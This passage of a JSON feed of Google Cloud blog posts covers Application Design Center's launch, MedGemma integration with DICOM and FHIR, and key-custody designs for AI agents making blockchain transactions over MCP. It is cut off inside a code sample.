style=\"vertical-align: baseline;\">By integrating Application Design Center into existing CI/CD workflows, platform teams empower developers to own the complete software delivery lifecycle right from their IDE. Developers can leverage compliant application </span><span style=\"font-style: italic; vertical-align: baseline;\">and</span><span style=\"vertical-align: baseline;\"> infrastructure (IaC) code using Application Design Center application templates. </span></p>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Further, every infrastructure decision made through Application Design Center is committed to code, versioned, and auditable. Specifically, developers can download the application IaC template from Application Design Center and import it into their app repos (the single source of truth), clone their repo, and edit the Terraform directly in their local IDEs. Any modifications go through a Git pull request for review. Once approved, this automatically triggers the existing CI/CD setup to build, test, and deploy both app and infra changes in lockstep. This unified approach minimizes friction, enforcing \"golden paths\" and providing an end-to-end automated pathway from a line of code in the IDE to a fully deployed change in production. </span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">What's new since preview</span></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">This GA launch is packed with features that users have been asking for. We’re excited to share powerful new capabilities: enterprise-grade governance and security with </span><a href=\"https://cloud.google.com/sdk/gcloud/reference/design-center\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public APIs and gcloud CLI support</span></a><span style=\"vertical-align: baseline;\">; </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/set-up-secure-perimeter\"><span style=\"text-decoration: underline; vertical-align: baseline;\">full compatibility with VPC service controls</span></a><span style=\"vertical-align: baseline;\">; </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/import-components\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bring your own Terraform</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/download-and-deploy#export_terraform_code\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GitOps support</span></a><span style=\"vertical-align: baseline;\"> for integration with your existing application patterns and automation pipelines; agentic application patterns using GKE templates (</span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-standard-cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Standard</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-autopilot-cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Autopilot</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/configure-gke-node-pool\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NodePool</span></a><span style=\"vertical-align: baseline;\">); and finally, a simplified onboarding experience with </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/setup\"><span style=\"text-decoration: underline; vertical-align: baseline;\">app-managed project support</span></a><span style=\"vertical-align: baseline;\">, making Application Design Center an AI-powered engine for your applications on Google Cloud.</span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Get started today</span></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">To help you get started, Google provides a growing library of curated Google application templates built by experts. These templates combine multiple Google Cloud products and best practices to serve common use cases, which you can configure for deployment, and view as infrastructure as code in-line. Platform teams can then create and securely share the catalogs and collaborate with teammates on designs and self-service deployment for developers. For enterprises with existing Terraform patterns and assets, Application Design Center interoperates by enabling their import and reuse within its native design and configuration experience.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ready to experience the power of </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/setup\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Application Design Center</span></a><span style=\"vertical-align: baseline;\">? </span><span style=\"vertical-align: baseline;\">You can learn more about ADC and get started building in minutes using the </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/quickstart-create-template\"><span style=\"text-decoration: underline; vertical-align: baseline;\">quickstart</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">You can start building your first AI-powered application template in minutes, </span><a href=\"https://cloud.google.com/products/application-design-center/pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">free of cost</span></a><span style=\"vertical-align: baseline;\">, and quickly deploy applications with working code. For deeper insights, explore the comprehensive public documentation </span><a href=\"https://docs.cloud.google.com/application-design-center/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. We can't wait to see how you innovate with the Application Design Center!</span></p></div>",
        "published_date": "2025-12-08 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/integrating-medgemma-into-clinical-workflows-just-got-easier/",
        "title": "Integrating MedGemma into clinical workflows just got easier!",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/dicom-fhir-blog-hero-image_1.max-600x600.png",
        "author": "Fereshteh Mahvar",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Our team, Google Heath AI Developer Foundations,</span> introduced </span><a href=\"https://developers.google.com/health-ai-developer-foundations/medgemma\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedGemma</span></a><span style=\"vertical-align: baseline;\"> earlier this year </span><a href=\"https://research.google/blog/google-research-at-google-io-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">in May</span></a><span style=\"vertical-align: baseline;\"> and later followed up </span><a href=\"https://research.google/blog/medgemma-our-most-capable-open-models-for-health-ai-development/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">in July </span></a><span style=\"vertical-align: baseline;\">with a 27-billion-parameter multimodal variant plus MedGemma’s vision encoder: </span><a href=\"https://developers.google.com/health-ai-developer-foundations/medsiglip\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedSigLIP</span></a><span style=\"vertical-align: baseline;\">. We’ve been humbled by the wide variety of model adaptations, research papers, and applications MedGemma has created across academia and industry!</span></p>\n<p><span style=\"vertical-align: baseline;\">Our aim is to meet you where you are in your research, development, and clinical integration journey. In the earlier releases, we prioritized simplicity, where image prompts were constructed from pixels decoded from non-medical image formats such as JPEG and PNG, and medical record snippets were fed into the model in </span><a href=\"https://en.wikipedia.org/wiki/JSON\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JSON</span></a><span style=\"vertical-align: baseline;\"> format or as plain text. </span></p>\n<p><span style=\"vertical-align: baseline;\">However, we acknowledge the complexities of integrating MedGemma into clinical workflows in an interoperable way. That’s why standard protocols like </span><span style=\"vertical-align: baseline;\">Digital Imaging and Communications in Medicine (</span><span style=\"vertical-align: baseline;\">DICOM) and </span><span style=\"vertical-align: baseline;\">Fast Healthcare Interoperability Resources </span><span style=\"vertical-align: baseline;\">(FHIR) are crucial for integration into clinical workflows. Today, we’re pleased to announce that we have made it simpler for developers who are working with these data formats. </span></p>\n<h2><span style=\"vertical-align: baseline;\">DICOMweb integration </span></h2>\n<p><span style=\"vertical-align: baseline;\">We are releasing a new Docker container for MedGemma which accepts medical images as DICOMweb links: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"http://us-docker.pkg.dev/deeplearning-platform-release/vertex-model-garden/health-ai-medgemma.1-0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Public container</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/Google-Health/medgemma/tree/main/python/serving\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Container source code</span></a><span style=\"vertical-align: baseline;\">  </span></p>\n</li>\n<li><a href=\"https://developers.google.com/health-ai-developer-foundations/medgemma/serving-api\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">API spec</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">You can use this new Docker container or source code directly to deploy DICOM-aware MedGemma services on any compute platform. However, if you're a user of Google Cloud Platform (GCP) with data stored in </span><a href=\"https://docs.cloud.google.com/healthcare-api/docs/concepts/dicom\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud DICOM Store</span></a><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">visit get started section in this post to get up and running</span><span style=\"vertical-align: baseline;\"> in minutes using pre-built resources on Vertex Model Garden.</span></p>\n<p><span style=\"vertical-align: baseline;\">Note that since inception, MedSigLIP container has had native understanding of DICOM; here’s the </span><a href=\"http://us-docker.pkg.dev/deeplearning-platform-release/vertex-model-garden/health-ai-medsiglip.1-0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public container</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://github.com/Google-Health/medsiglip/tree/main/python/serving\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">the container source code</span></a><span style=\"vertical-align: baseline;\">, and <a href=\"https://developers.google.com/health-ai-developer-foundations/medsiglip/serving-api\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">API spec</span></a></span><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">When your interactive user-facing applications have to deal with complex modalities such as digital pathology Whole Slide Imaging (WSI) or multi-dimensional radiology imaging such as Computed Tomography (CT) or Magnetic Resonance Imaging (MRI), reading images server-side optimizes network performance and bypasses API payload restrictions. Furthermore, this architecture hardens security in transit and ensures consistent, deterministic data preprocessing.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"client-server_medgemma_blog\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/client-server_medgemma_blog.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Note that as a GCP user, you are not limited to deployment via Model Garden which currently deploys the model and its custom container using a fixed configuration to a </span><a href=\"https://docs.cloud.google.com/vertex-ai/docs/predictions/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex online inference endpoint</span></a><span style=\"vertical-align: baseline;\"> for you. Please refer to the </span><a href=\"https://developers.google.com/health-ai-developer-foundations/model-serving/overview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">serving architecture document</span></a><span style=\"vertical-align: baseline;\"> to understand your deployment options. </span></p>\n<h2><span style=\"vertical-align: baseline;\">FHIR navigation agent demonstration</span></h2>\n<p><span style=\"vertical-align: baseline;\">In our FHIR integration approach, we configured MedGemma and the </span><a href=\"https://docs.cloud.google.com/healthcare-api/docs/concepts/fhir\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GCP FHIR Store</span></a><span style=\"vertical-align: baseline;\"> as executable tools for an agent. We show how the agent formulates prompts requiring a patient's full medical records without feeding their entire FHIR history into MedGemma's context window, leveraging MedGemma's awareness of the FHIR standard to intelligently navigate patient data. We demonstrate an implementation using </span><a href=\"https://www.langchain.com/langgraph\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LangGraph</span></a><span style=\"vertical-align: baseline;\">, a popular agentic framework, though the same can be achieved using other agentic frameworks including the </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-development-kit/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GCP’s Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\">. V<span style=\"vertical-align: baseline;\">isit the get started section in this post </span></span><span style=\"vertical-align: baseline;\">and see how an agent can intelligently navigate patient data.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Get started</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For DICOM-aware MedGemma,</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/medgemma\"><span style=\"text-decoration: underline; vertical-align: baseline;\">start with the model on Model Garden</span></a><span style=\"vertical-align: baseline;\"> and use the new drop down options to deploy either 4B or 27B variants. Once deployed, use </span><a href=\"https://github.com/google-health/medgemma/blob/main/notebooks/quick_start_with_dicom.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this tutorial notebook</span></a><span style=\"vertical-align: baseline;\"> to see how to prompt the model with links to the medical images instead of the image pixels.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"mg-options\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/mg-options.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">For FHIR navigation demonstration,</strong><span style=\"vertical-align: baseline;\"> start with the </span><a href=\"https://huggingface.co/spaces/google/ehr-navigator-agent-with-medgemma\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">illustrative app</span></a><span style=\"vertical-align: baseline;\"> and then look into the technical details in the </span><a href=\"https://github.com/google-health/medgemma/blob/main/notebooks/ehr_navigator_agent.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">demo notebook</span></a><span style=\"vertical-align: baseline;\">.</span><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ehr-agent\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/ehr-agent.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">What’s next</span></h2>\n<p><span style=\"vertical-align: baseline;\">If you are looking to build advanced agentic solutions, systems that use LLMs to perform complex, multi-step tasks, </span><a href=\"https://modelcontextprotocol.io/docs/getting-started/intro\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Model Context Protocol (MCP)</span></a><span style=\"vertical-align: baseline;\"> is a reliable way to manage and deliver all the necessary context and data. To leverage MCP on GCP, you should take advantage of</span><a href=\"https://googleapis.github.io/genai-toolbox/dev/getting-started/introduction/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> the open MCP Toolbox for Databases</span></a><span style=\"vertical-align: baseline;\"> and its </span><a href=\"https://medium.com/google-cloud/unlocking-healthcare-innovation-integrating-google-cloud-healthcare-api-with-mcp-toolbox-and-adk-9d9ba5bc8f14\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">integration with GCP Healthcare API</span></a><span style=\"vertical-align: baseline;\">. If you are working with medical imaging, you can use the new DICOM-aware MedGemma to achieve more efficient server-side DICOM processing in your MCP configuration, accelerating the preparation of clinical context for your agentic applications.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Resources and support </span></h2>\n<p><span style=\"vertical-align: baseline;\">Our mission is to enable your success. Here are the best ways to engage with our team and the community:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Seek technical support</strong><span style=\"vertical-align: baseline;\"> on the </span><a href=\"https://discuss.ai.google.dev/c/hai-def/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">HAI-DEF developer forum</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">File technical issues</strong><span style=\"vertical-align: baseline;\"> directly in the </span><a href=\"https://github.com/Google-Health/medgemma/issues\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedGemma</span></a><span style=\"vertical-align: baseline;\"> or </span><a href=\"https://github.com/Google-Health/medsiglip/issues\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MedSigLIP</span></a><span style=\"vertical-align: baseline;\"> GitHub repos.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Help shape our roadmap</strong><span style=\"vertical-align: baseline;\"> by sharing your use cases via our </span><a href=\"https://services.google.com/fb/forms/hai-def-feedback/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">feedback form</span></a><span style=\"vertical-align: baseline;\">. This helps us align our engineering efforts with the industry's most common needs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stay updated</strong><span style=\"vertical-align: baseline;\"> on new tools and models by signing up for </span><a href=\"https://services.google.com/fb/forms/hai-def-news/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our newsletter</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Access all resources</strong><span style=\"vertical-align: baseline;\"> by bookmarking </span><a href=\"http://goo.gle/hai-def\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">goo.gle/hai-def</span></a><span style=\"vertical-align: baseline;\">, your one-stop shop for everything we offer.</span></p>\n</li>\n</ul>\n<hr />\n<p><span style=\"vertical-align: baseline;\"><em>This post includes additional contributions from <strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Liron Yatziv - </span></span></strong></em><em><strong>Software Engineer</strong>, </em><em><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Kenneth Philbrick - Software Engineer, Bram Sterling - Software Engineer,</span></span></strong><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"> Tiffany Chen - Software Engineer, </span></span></strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">and <strong>Can Kirmizi - Software Engineer</strong>.</span></span></em></span></p>\n<p> </p></div>",
        "published_date": "2025-12-08 11:13:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/using-mcp-with-web3-how-to-secure-blockchain-interacting-agents/",
        "title": "Using MCP with Web3: How to secure agents making blockchain transactions",
        "thumbnail": null,
        "author": "Adrien Delaroche",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we sit at a unique intersection of two transformative technologies: AI and Web3. The rise of AI agents capable of interacting with blockchains opens up a world of automated financial strategies, fast payments, and more complex scenarios like executing complex DeFi operations and bridging assets across multiple chains. </span></p>\n<p><span style=\"vertical-align: baseline;\">However, the practical viability of this new paradigm hinges on who hosts the agent, and who holds the private key to the operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">The core issue is simple. Since most cryptocurrency users are not going to run their own secure servers to manage agent keys, providers are likely to turn to one of two primary architectures: A custodial model where users delegate funds to a third-party agent that controls a private key, and a non-custodial model where the agent only crafts transactions for the user to sign with its own private key.</span></p>\n<p><span style=\"vertical-align: baseline;\">Most of today’s examples showcase an agent directly holding a private key, and most cryptocurrency model context protocol (MCP) servers can only be used if you configure them with a private key. However, that may not be the only option.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">The agent-controlled model</strong></h2>\n<p><span style=\"vertical-align: baseline;\">This model is designed for a world where users interact with agents hosted by a third party — a realistic assumption for mainstream adoption. In this scenario, you don’t give the agent your private key. Instead, the agent has its own key, and you give it an allowance to spend on your behalf.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How it works</strong></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - Agent-controlled model sequence diagram\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_-_Agent-controlled_model_sequence_diagra.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Agent-controlled model sequence diagram.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent gets a wallet</strong><span style=\"vertical-align: baseline;\">: The agent possesses one or multiple private keys. The private keys for these wallets are managed securely by the host of the agent, never by you.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">User delegates funds</strong><span style=\"vertical-align: baseline;\">: From your personal wallet (such as MetaMask, or a hardware wallet), you send a specific amount  to the agent’s public address.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent gains autonomy</strong><span style=\"vertical-align: baseline;\">: The agent now has full, autonomous control over the funds in the wallet it controls. The agent can use its key to sign and execute transactions — swapping tokens, buying NFTs, and paying another agent for data — until the pre-paid balance runs out.</span></p>\n</li>\n</ol>\n<h3><strong style=\"vertical-align: baseline;\">The inherent risks</strong></h3>\n<p><span style=\"vertical-align: baseline;\">While this model provides automation, it introduces significant risks that shift from you to the agent and its host.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Performance risk</strong><span style=\"vertical-align: baseline;\">: The agent could be bad at its job: A trading agent might execute a flawed strategy and lose the funds you delegated. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Malice risk</strong><span style=\"vertical-align: baseline;\">: A poorly-designed or intentionally-malicious agent could misuse the funds. For example, the agent could send its balance to an unauthorized address. To prevent that scenario, the hosting platform should have robust safeguards, audits, and rules to constrain agent behavior. Another option is to ensure the agent funds are secure in a smart contract that guarantees how the funds are going to be used.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Security risk</strong><span style=\"vertical-align: baseline;\">: The third-party host is now a custodian of your delegated funds. If their platform is hacked and the agents’ private keys are compromised, your pre-paid balance would be a primary target. </span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">The self-hosted variant </span></h2>\n<p><span style=\"vertical-align: baseline;\">A small minority of technically advanced users will want to run this model on a personal server. Because we’re in the nascent stages of AI agent development, this small group of developers and early adopters represents the current primary user base.</span></p>\n<p><span style=\"vertical-align: baseline;\">Consequently, this self-hosted model is the one most encountered in today's landscape, and it's what most crypto MCP servers are being built to cater for. In this case, it’s technically viable to give the agent a private key, because the key never leaves the user's own controlled environment.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - Self-hosted agent model sequence diagram\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_-_Self-hosted_agent_model_sequence_diagr.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Self-hosted agent model sequence diagram.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">However, it also comes with a very high risk level. The private key can get hacked if your machine is compromised, and erratic, unauthorized agent behavior can lead to significant losses. </span></p>\n<p><span style=\"vertical-align: baseline;\">For example, if you say “I want to swap 500 USD for UNI”, the agent could decide to sell the UNI, or buy the UNI, mess up the slippage percentage, or buy the wrong UNI token. We recommend using this approach only for tests.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The transaction-crafter model</span></h2>\n<p><span style=\"vertical-align: baseline;\">This is the non-custodial and fundamentally more secure alternative for most user interactions. Here, the agent never holds any of your funds. Its purpose is to do exactly the same thing as the agent-controlled model, but instead of signing and sending the key, the transaction is returned for the user to sign and send the key to the blockchain network.</span></p>\n<h3><span style=\"vertical-align: baseline;\">How it works</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3 - Transaction crafter model sequence diagram\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_-_Transaction_crafter_model_sequence_dia.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Transaction crafter model sequence diagram.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">User instructs agent</strong><span style=\"vertical-align: baseline;\">: You ask the agent to perform a task, such as “swap my ETH for USDC.”</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent crafts the transaction</strong><span style=\"vertical-align: baseline;\">: The agent analyzes your query, and constructs the raw transaction, such as the swap transaction.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">User signs the transaction</strong><span style=\"vertical-align: baseline;\">: The agent passes this data back to you. Your wallet displays a pop-up showing exactly what you are about to do. Only you can approve and sign it with your private key.</span></p>\n</li>\n</ol>\n<h2><span style=\"vertical-align: baseline;\">How to build the agent with Google Cloud tools</span></h2>\n<p><span style=\"vertical-align: baseline;\">To demonstrate this model, I built a sample agent using a suite of Google Cloud tools. The agent's reasoning is powered by the Gemini 2.0 Flash model and orchestrated using the </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Agent Development Kit</span></a><span style=\"vertical-align: baseline;\"> (ADK). For testing, I acquired funds from the public </span><a href=\"https://cloud.google.com/application/web3/faucet\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Ethereum Faucet</span></a><span style=\"vertical-align: baseline;\">, a key resource for developers. </span></p>\n<p><span style=\"vertical-align: baseline;\">Developing agents using ADK is quite simple, and comes with useful features such as a web UI for simple testing and development environment, a powerful integration to </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Engine</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/run?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Run</span></a><span style=\"vertical-align: baseline;\"> to easily deploy the agent in production, a simple way to run the agent as an API server for easy connection with a custom front end, and a toolbox to easily connect to MCP Servers, Agent-to-Agent (A2A) protocol, and tools such as Google search. </span></p>\n<p><span style=\"vertical-align: baseline;\">If you want to learn more about how to build agents using the Google Cloud stack, you can </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/build-web3-ai-agents-with-google-cloud?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">read this article</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_cejGPDZ.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The two main parts of this app are the agent that crafts transactions, and the front end that gets the crafted transaction from the agent and sends it to MetaMask for signature and sending.</span></p>\n<p><span style=\"vertical-align: baseline;\">The agent using Google ADK is quite simple to develop, the craft_eth_transaction function though can be quite complicated depending on the type of operations supported. These can include chains, assets, and swaps: </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;from google.adk.agents import Agent\\r\\nfrom web3 import Web3\\r\\n\\r\\nETH_RPC_URL = &quot;RPC 